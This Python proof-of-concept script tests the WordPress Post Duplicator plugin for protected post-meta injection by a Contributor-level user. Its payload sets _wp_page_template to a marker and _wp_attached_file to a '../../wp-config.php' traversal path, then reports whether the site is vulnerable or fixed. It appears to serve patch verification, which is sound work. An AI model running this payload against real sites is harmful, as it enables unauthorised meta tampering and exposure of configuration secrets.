#!/usr/bin/env python3
"""
PoC: Post Duplicator - Arbitrary Protected Post Meta Insertion (Vulnerability Verification)
Requires: Contributor-level WordPress account

Run with: WP_URL=http://your-site.test USERNAME=contributor PASSWORD=password python3 poc_vulnerability_test.py
"""
import os
import sys
import json
import ssl
import urllib.request
import urllib.error
import http.cookiejar

WP_URL = os.environ.get("WP_URL", "http://metaphortesting.test").rstrip("/")
USERNAME = os.environ.get("USERNAME", "contributor")
PASSWORD = os.environ.get("PASSWORD", "")

if not PASSWORD:
    print("Set PASSWORD env var (Contributor account)")
    sys.exit(1)

# Create cookie jar and opener
cookie_jar = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(
    urllib.request.HTTPCookieProcessor(cookie_jar),
    urllib.request.HTTPSHandler(context=ssl.create_default_context()),
)
urllib.request.install_opener(opener)


def req(method, url, data=None, headers=None):
    h = {"User-Agent": "Mozilla/5.0 PoC-Test"}
    if headers:
        h.update(headers)
    if data is not None and isinstance(data, dict):
        data = json.dumps(data).encode()
    req_obj = urllib.request.Request(url, data=data, headers=h, method=method)
    try:
        with urllib.request.urlopen(req_obj, timeout=30) as r:
            return r.read().decode(), r.getcode()
    except urllib.error.HTTPError as e:
        return e.read().decode() if e.fp else "", e.code
    except Exception as e:
        return str(e), 0


def main():
    print(f"Target: {WP_URL}")
    print(f"User: {USERNAME}")
    print("-" * 50)

    # Step 1: Authenticate
    print("Step 1: Authenticating...")
    login_data = urllib.parse.urlencode({
        "log": USERNAME, "pwd": PASSWORD,
        "wp-submit": "Log In", "redirect_to": f"{WP_URL}/wp-admin/",
        "testcookie": "1",
    }).encode()
    login_req = urllib.request.Request(
        f"{WP_URL}/wp-login.php",
        data=login_data,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(login_req, timeout=30) as r:
            redir = r.geturl()
            if "wp-admin" not in redir and "dashboard" not in redir.lower():
                print("Login failed - check credentials")
                sys.exit(1)
    except urllib.error.HTTPError as e:
        if e.code in (302, 301):
            redir = e.headers.get("Location", "")
            if "wp-admin" not in redir:
                print("Login failed - check credentials")
                sys.exit(1)
        else:
            print("Login failed")
            sys.exit(1)
    except Exception as e:
        print(f"Login error: {e}")
        sys.exit(1)
    print("Login OK")

    # Step 2: Get REST nonce
    print("Step 2: Getting REST nonce...")
    nonce_body, _ = req("GET", f"{WP_URL}/wp-admin/admin-ajax.php?action=rest-nonce")
    nonce = nonce_body.strip()
    if not nonce or len(nonce) < 10:
        print("Nonce fetch failed")
        sys.exit(1)
    print(f"Nonce: {nonce[:20]}...")

    headers = {"X-WP-Nonce": nonce, "Content-Type": "application/json"}

    # Step 3: Find an existing post to duplicate
    print("Step 3: Finding post to duplicate...")
    body, code = req("GET", f"{WP_URL}/wp-json/wp/v2/posts?per_page=1&status=any", headers=headers)
    if code != 200:
        body, code = req("GET", f"{WP_URL}/wp-json/wp/v2/pages?per_page=1&status=any", headers=headers)
    if code != 200:
        print(f"Posts fetch failed: {code}")
        sys.exit(1)
    posts = json.loads(body)
    if not posts:
        print("No posts/pages found")
        sys.exit(1)

    original_id = posts[0]["id"]
    print(f"Original post ID: {original_id}")

    # Step 4: Duplicate with protected meta injection attempt
    print("Step 4: Attempting injection via duplicate-post...")
    payload = {
        "original_id": original_id,
        "status": "draft",
        "includeCustomMeta": True,
        "customMetaData": [
            {"key": "_wp_page_template", "value": "INJECTED_VALUE"},
            {"key": "_wp_attached_file", "value": "../../wp-config.php"},
        ],
    }

    dup_body, dup_code = req(
        "POST",
        f"{WP_URL}/wp-json/post-duplicator/v1/duplicate-post",
        headers=headers,
        data=payload,
    )

    if dup_code != 200:
        print(f"Duplicate request failed: {dup_code}")
        print(dup_body[:500] if dup_body else "")
        sys.exit(1)

    result = json.loads(dup_body)
    duplicate_id = result.get("duplicate_id")
    if not duplicate_id:
        print("No duplicate_id in response")
        sys.exit(1)
    print(f"Duplicate created: {duplicate_id}")

    # Step 5: Verify - injection should FAIL (vulnerability fixed)
    print("Step 5: Checking if injection succeeded...")
    meta_body, meta_code = req(
        "GET", f"{WP_URL}/wp-json/wp/v2/posts/{duplicate_id}?context=edit", headers=headers
    )
    if meta_code != 200:
        meta_body, meta_code = req(
            "GET", f"{WP_URL}/wp-json/wp/v2/pages/{duplicate_id}?context=edit", headers=headers
        )

    template_val = ""
    if meta_code == 200:
        meta_data = json.loads(meta_body)
        template_val = meta_data.get("template", "")

    print("-" * 50)
    print("RESULT:")
    print(f"  template (from REST): {template_val!r}")

    # Check via post-data endpoint for actual meta on duplicate
    injected_found = False
    try:
        pd_body, pd_code = req(
            "GET", f"{WP_URL}/wp-json/post-duplicator/v1/post-data/{duplicate_id}", headers=headers
        )
        if pd_code == 200:
            pd_data = json.loads(pd_body)
            custom_meta = pd_data.get("customMeta", [])
            for m in custom_meta:
                k, v = m.get("key"), str(m.get("value", ""))
                if k == "_wp_page_template" and "INJECTED_VALUE" in v:
                    injected_found = True
                    print(f"  _wp_page_template = INJECTED_VALUE (INJECTED!)")
                elif k == "_wp_attached_file" and "wp-config" in v:
                    injected_found = True
                    print(f"  _wp_attached_file = wp-config path (INJECTED!)")
    except Exception as e:
        print(f"  (Could not check post-data: {e})")

    # Vulnerability FIXED if injected values are NOT present
    if template_val == "INJECTED_VALUE" or injected_found:
        print("\n*** VULNERABLE: Injection succeeded! ***")
        sys.exit(1)
    else:
        print("\n*** SECURE: Injection blocked - vulnerability is fixed ***")
        sys.exit(0)


if __name__ == "__main__":
    main()
